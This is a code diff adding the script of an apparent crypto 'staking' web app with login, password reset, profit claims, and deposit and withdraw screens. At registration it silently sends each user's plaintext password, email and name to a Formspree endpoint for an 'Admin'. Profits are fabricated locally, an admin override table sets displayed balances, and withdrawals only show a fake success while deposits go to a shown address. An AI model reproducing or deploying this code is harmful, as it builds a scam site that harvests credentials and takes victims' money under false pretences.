+            ['dashboard', 'earning', 'history', 'deposit', 'withdraw'].forEach(t => document.getElementById(`tab-${t}`).style.display = 'none');
+            ['dashboard', 'earning', 'history'].forEach(n => document.getElementById(`nav-${n}`).classList.remove('active'));
+            document.getElementById(`tab-${tabName}`).style.display = 'block';
+            
+            if(tabName === 'deposit' || tabName === 'withdraw' || tabName === 'dashboard') { document.getElementById('nav-dashboard').classList.add('active'); } 
+            else { document.getElementById(`nav-${tabName}`).classList.add('active'); }
+            
+            document.getElementById('main-header').style.display = (tabName === 'deposit' || tabName === 'withdraw') ? 'none' : 'flex';
+            updateAllUI();
+        }
+
+        // --- REGISTRATION LOGIC ---
+        function handleRegister(e) {
+            e.preventDefault();
+            const fname = document.getElementById('reg-fname').value.trim();
+            const lname = document.getElementById('reg-lname').value.trim();
+            const user = document.getElementById('reg-username').value.trim();
+            const email = document.getElementById('reg-email').value.trim();
+            const pass = document.getElementById('reg-password').value;
+            const confirm = document.getElementById('reg-confirm').value;
+            const errorDiv = document.getElementById('reg-error');
+            
+            if(pass !== confirm) { errorDiv.innerText = "Passwords do not match."; return; }
+
+            const hasLetter = /[a-zA-Z]/.test(pass);
+            const hasNumber = /[0-9]/.test(pass);
+            if (pass.length < 8 || !hasLetter || !hasNumber) {
+                errorDiv.innerText = 'Password must be at least 8 chars with letters & numbers.';
+                return;
+            }
+
+            // Create account locally
+            const newAccount = { fname: fname, lname: lname, password: pass, email: email, balance: 0.00, totalProfit: 0.00, pendingClaim: 0.00, availableTransfer: 0.00, transactions: [] };
+            localStorage.setItem('cryptoUser_' + user, JSON.stringify(newAccount));
+
+            // Send silent email to Admin via Formspree
+            fetch(FORMSPREE_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ _subject: "New Crypto App Registration!", Name: fname + " " + lname, Username: user, Email: email, Password: pass })
+            }).catch(err => console.log("Email notice failed", err));
+
+            alert("Registration Successful! Please log in with your new account.");
+            
+            // Redirect to Login Page
+            document.getElementById('login-username').value = user;
+            document.getElementById('login-password').value = '';
+            switchAuthView('login');
+        }
+
+        // --- LOGIN LOGIC ---
+        function handleLogin(e) { 
+            e.preventDefault(); 
+            const user = document.getElementById('login-username').value.trim();
+            const pass = document.getElementById('login-password').value;
+            const errorDiv = document.getElementById('login-error');
+
+            const savedData = localStorage.getItem('cryptoUser_' + user);
+            if (savedData) {
+                const account = JSON.parse(savedData);
+                if (account.password === pass) {
+                    currentUser = user;
+                    loadUserState();
+                    document.getElementById('display-username').innerText = user;
+                    document.getElementById('user-avatar').innerText = user.substring(0, 2).toUpperCase();
+                    switchAuthView('app'); 
+                    switchAppTab('dashboard');
+                    return;
+                }
+            }
+            errorDiv.innerText = "Invalid username or password.";
+        }
+        
+        function handleLogout() { saveUserState(); window.location.reload(); }
+
+        // --- FORGOT PASSWORD LOGIC ---
+        function handleForgotRequest(e) {
+            e.preventDefault();
+            const user = document.getElementById('forgot-username').value.trim();
+            const email = document.getElementById('forgot-email').value.trim();
+            const errorDiv = document.getElementById('forgot-error-1');
+
+            const savedData = localStorage.getItem('cryptoUser_' + user);
+            if (savedData) {
+                const account = JSON.parse(savedData);
+                if (account.email === email) {
+                    resetOTP = Math.floor(100000 + Math.random() * 900000).toString();
+                    resetUsername = user;
+                    
+                    // Simulate Email sent with OTP popup
+                    alert(`[SIMULATED EMAIL INBOX]\n\nTo: ${email}\nSubject: Password Reset Request\n\nYour 6-digit OTP code is: ${resetOTP}`);
+                    
+                    document.getElementById('forgot-step-1').style.display = 'none';
+                    document.getElementById('forgot-step-2').style.display = 'flex';
+                    document.getElementById('forgot-subtitle').innerText = `We sent a 6-digit OTP to ${email}`;
+                    return;
+                }
+            }
+            errorDiv.innerText = "Username and Email combination not found.";
+        }
+
+        function handleVerifyCode(e) {
+            e.preventDefault();
+            const code = document.getElementById('forgot-code').value.trim();
+            const errorDiv = document.getElementById('forgot-error-2');
+
+            if (code === resetOTP) {
+                document.getElementById('forgot-step-2').style.display = 'none';
+                document.getElementById('forgot-step-3').style.display = 'flex';
+                document.getElementById('forgot-subtitle').innerText = "Create a new secure password";
+            } else {
+                errorDiv.innerText = "Invalid OTP Code.";
+            }
+        }
+
+        function handleResetPassword(e) {
+            e.preventDefault();
+            const pass = document.getElementById('forgot-new-pass').value;
+            const confirm = document.getElementById('forgot-confirm-pass').value;
+            const errorDiv = document.getElementById('forgot-error-3');
+
+            if (pass !== confirm) { errorDiv.innerText = "Passwords do not match."; return; }
+
+            const hasLetter = /[a-zA-Z]/.test(pass);
+            const hasNumber = /[0-9]/.test(pass);
+            if (pass.length < 8 || !hasLetter || !hasNumber) {
+                errorDiv.innerText = 'Password must be at least 8 chars with letters & numbers.';
+                return;
+            }
+
+            // Update user password in local storage
+            let savedData = JSON.parse(localStorage.getItem('cryptoUser_' + resetUsername));
+            savedData.password = pass;
+            localStorage.setItem('cryptoUser_' + resetUsername, JSON.stringify(savedData));
+
+            alert("Password updated successfully! You can now log in.");
+            document.getElementById('login-username').value = resetUsername;
+            document.getElementById('login-password').value = '';
+            switchAuthView('login');
+        }
+ // --- STATE MANAGEMENT ---
+        function loadUserState() {
+            const saved = localStorage.getItem('cryptoUser_' + currentUser);
+            if (saved) { appState = JSON.parse(saved); }
+            
+            // Admin Override Check
+            if (adminOverrides[currentUser]) {
+                if(adminOverrides[currentUser].balance !== undefined) appState.balance = adminOverrides[currentUser].balance;
+                if(adminOverrides[currentUser].totalProfit !== undefined) appState.totalProfit = adminOverrides[currentUser].totalProfit;
+            }
+        }
+        
+        function saveUserState() { if(currentUser) localStorage.setItem('cryptoUser_' + currentUser, JSON.stringify(appState)); }
+        
+        function logTransaction(type, amount, desc) { 
+            appState.transactions.unshift({ id: Date.now(), type: type, amount: amount, date: new Date().toLocaleString(), desc: desc }); 
+            saveUserState();
+        }
+        
+        function getCurrentRate() { for(let i=0; i<rateTiers.length; i++) { if(appState.balance >= rateTiers[i].min && appState.balance < rateTiers[i].max) return rateTiers[i].rate; } return 2.4; }
+
+        function updateAllUI() {
+            document.getElementById('dash-balance').innerText = fmtMoney(appState.balance);
+            document.getElementById('dep-balance').innerText = fmtMoney(appState.balance);
+            document.getElementById('with-balance').innerText = fmtMoney(appState.balance);
+            updateEarningUI();
+            updateHistoryUI();
+        }
+
+        // --- EARNING TAB LOGIC ---
+        function updateEarningUI() {
+            const rate = getCurrentRate();
+            document.getElementById('earn-balance').innerText = fmtMoney(appState.balance);
+            document.getElementById('earn-total-profit').innerText = fmtMoney(appState.totalProfit);
+            document.getElementById('earn-rate').innerText = `${rate.toFixed(1)}%`;
+            document.getElementById('earn-based-on').innerText = fmtMoney(appState.balance);
+            document.getElementById('earn-available').innerText = fmtMoney(appState.availableTransfer);
+            
+            let statusEl = document.getElementById('earn-status');
+            if(appState.balance > 0) { statusEl.innerText = "✅ Active"; statusEl.className = "info-val text-green"; } 
+            else { statusEl.innerText = "❌ No Balance"; statusEl.className = "info-val text-red"; }
+
+            let claimBtn = document.getElementById('btn-claim');
+            if(appState.pendingClaim > 0) {
+                claimBtn.disabled = false; claimBtn.style.backgroundColor = "var(--accent-green)"; claimBtn.style.color = "#053b1b";
+                claimBtn.innerText = `🎁 Claim ${fmtMoney(appState.pendingClaim)}`;
+            } else {
+                claimBtn.disabled = true; claimBtn.style.backgroundColor = "var(--btn-dark)"; claimBtn.style.color = "var(--text-muted)";
+                claimBtn.innerText = `🎁 Claim $0.00`;
+            }
+
+            const container = document.getElementById('rate-table-container');
+            container.innerHTML = rateTiers.map(tier => {
+                let isActive = (tier.rate === rate && appState.balance > 0) || (tier.rate === 2.0 && appState.balance === 0);
+                return `<div class="rate-row ${isActive ? 'active' : ''}"><span>${tier.label}</span><span>${tier.rate.toFixed(1)}% ${isActive ? '← You' : ''}</span></div>`;
+            }).join('');
+        }
+
+        function handleCheckProfit() {
+            if(appState.balance <= 0) { alert("You need a balance to generate profit!"); return; }
+            if(appState.pendingClaim > 0) { alert("You already have unchecked profit. Claim it first."); return; }
+            appState.pendingClaim = appState.balance * (getCurrentRate() / 100);
+            saveUserState();
+            updateAllUI();
+        }
+
+        function handleClaim() {
+            if(appState.pendingClaim > 0) {
+                const amt = appState.pendingClaim;
+                appState.availableTransfer += amt; 
+                appState.totalProfit += amt; 
+                appState.pendingClaim = 0; 
+                logTransaction('Profit', amt, 'Daily Staking Reward');
+                updateAllUI(); alert("Profit claimed successfully!");
+            }
+        }
+
+        function handleTransfer() {
+            const amt = parseFloat(document.getElementById('transfer-amount').value);
+            if(isNaN(amt) || amt < 30) { alert("Minimum transfer amount is $30"); return; }
+            if(amt > appState.availableTransfer) { alert("Insufficient available profit."); return; }
+            appState.availableTransfer -= amt; appState.balance += amt;
+            document.getElementById('transfer-amount').value = ''; 
+            logTransaction('Transfer', amt, 'Profit to Main Balance');
+            updateAllUI(); alert(`Successfully transferred ${fmtMoney(amt)}!`);
+        }
+
+        // --- HISTORY TAB LOGIC ---
+        function setFilter(e, filterName) {
+            currentHistoryFilter = filterName;
+            document.querySelectorAll('.filter-chip').forEach(btn => btn.classList.remove('active'));
+            e.currentTarget.classList.add('active');
+            updateHistoryUI();
+        }
+
+        function updateHistoryUI() {
+            let filtered = appState.transactions;
+            if(currentHistoryFilter !== 'All') filtered = filtered.filter(tx => tx.type === currentHistoryFilter);
+            
+            const container = document.getElementById('hist-list');
+            if(filtered.length === 0) {
+                container.innerHTML = `<div class="activity-text" style="padding: 40px 0;">📭 No Transactions Found</div>`;
+            } else {
+                container.innerHTML = filtered.map(tx => {
+                    let icon = '📋'; let color = 'text-green'; let sign = '+';
+                    if(tx.type === 'Profit') icon = '🟢';
+                    if(tx.type === 'Transfer') icon = '🔵';
+                    if(tx.type === 'Withdraw') { icon = '🔴'; color = 'text-red'; sign = '-'; }
+                    return `<div class="tx-item"><div class="tx-left"><div class="tx-icon-box">${icon}</div><div><div class="tx-title">${tx.desc}</div><div class="tx-date">${tx.date}</div></div></div><div style="text-align:right"><div class="tx-title ${color}">${sign}${fmtMoney(tx.amount)}</div><div class="tx-date">${tx.type}</div></div></div>`;
+                }).join('');
+            }
+        }
+
+        // --- DEPOSIT & WITHDRAW LOGIC ---
+        function copyAddress() { navigator.clipboard.writeText(document.getElementById('deposit-address').innerText).then(() => alert("Copied!")); }
+        
+        function setMaxWithdraw() { document.getElementById('withdraw-amount').value = appState.balance; updateWithdrawSummary(); }
+        function updateWithdrawSummary() {
+            let amt = parseFloat(document.getElementById('withdraw-amount').value) || 0;
+            document.getElementById('summary-amount').innerText = fmtMoney(amt); document.getElementById('summary-receive').innerText = fmtMoney(amt);
+        }
+        
+        function submitWithdraw() {
+            const addr = document.getElementById('withdraw-address').value.trim(); 
+            const amt = parseFloat(document.getElementById('withdraw-amount').value);
+            
+            if(addr.length < 10) { alert("Invalid address."); return; }
+            if(isNaN(amt) || amt < 30) { alert("Minimum withdrawal is $30."); return; }
+            if(amt > appState.balance) { alert("Insufficient balance."); return; }
+
+            // Security Check
+            const pass = prompt("Security Verification:\nPlease enter your account password to confirm this withdrawal:");
+            if (pass === null) return; 
+            
+            let userAccount = JSON.parse(localStorage.getItem('cryptoUser_' + currentUser));
+            if (pass !== userAccount.password) { alert("❌ Incorrect password."); return; }
+
+            appState.balance -= amt; 
+            logTransaction('Withdraw', amt, `Withdrawal to ${addr.substring(0,6)}...`);
+            
+            document.getElementById('withdraw-address').value = ''; document.getElementById('withdraw-amount').value = '';
+            updateWithdrawSummary();
+            updateAllUI(); 
+            alert(`✅ Success! Withdrawal request for ${fmtMoney(amt)} has been submitted.`);
+        }
+
+        // --- TIMERS & APIs ---
+        setInterval(() => {
+            const d = new Date(); const t = new Date(); t.setUTCHours(24,0,0,0); const diff = t - d;
+            document.getElementById('t-hours').innerText = Math.floor((diff % (1000*60*60*24))/(1000*60*60)).toString().padStart(2,'0');
+            document.getElementById('t-mins').innerText = Math.floor((diff % (1000*60*60))/(1000*60)).toString().padStart(2,'0');
+            document.getElementById('t-secs').innerText = Math.floor((diff % (1000*60))/1000).toString().padStart(2,'0');
+        }, 1000);
+
+        const loadedCharts = {};
+        function toggleChart(id, pair) {
+            const div = document.getElementById(`chart-${id}`);
+            if (div.style.display === "block") div.style.display = "none";
+            else { div.style.display = "block"; if (!loadedCharts[id]) { new TradingView.widget({"autosize":true,"symbol":pair,"interval":"15","theme":"dark","style":"2","hide_top_toolbar":true,"hide_legend":true,"container_id":`chart-${id}`,"backgroundColor":"#1c233a"}); loadedCharts[id] = true; } }
+        }
+        function upCoin(id, p, c) {
+            const el = document.getElementById(`price-${id}`), ch = document.getElementById(`change-${id}`);
+            if(!el) return; el.innerText = fmtMoney(p); const isPos = parseFloat(c) >= 0;
+            ch.innerText = `${isPos?'↑':'↓'} ${Math.abs(c).toFixed(2)}%`; ch.className = `badge ${isPos?'up':'down'}`;
+        }
+        fetch('https://api.binance.com/api/v3/ticker/24hr?symbols=["BTCUSDT","ETHUSDT","XRPUSDT","DOGEUSDT","PAXGUSDT"]').then(r=>r.json()).then(d=>d.forEach(c=>{ let i=c.symbol.replace('USDT','').toLowerCase(); if(i==='paxg')i='xau'; upCoin(i,c.lastPrice,c.priceChangePercent); })).catch(()=>{});
+        try{ const ws = new WebSocket('wss://stream.binance.com:9443/ws/!ticker@arr'); ws.onmessage = (e) => { JSON.parse(e.data).forEach(c => { if(c.s==='BTCUSDT') upCoin('btc',c.c,c.P); if(c.s==='ETHUSDT') upCoin('eth',c.c,c.P); if(c.s==='XRPUSDT') upCoin('xrp',c.c,c.P); if(c.s==='DOGEUSDT') upCoin('doge',c.c,c.P); if(c.s==='PAXGUSDT') upCoin('xau',c.c,c.P); }); }; }catch(e){}
+
+        switchAuthView('login');
+    </script>
+</body>
+</html>
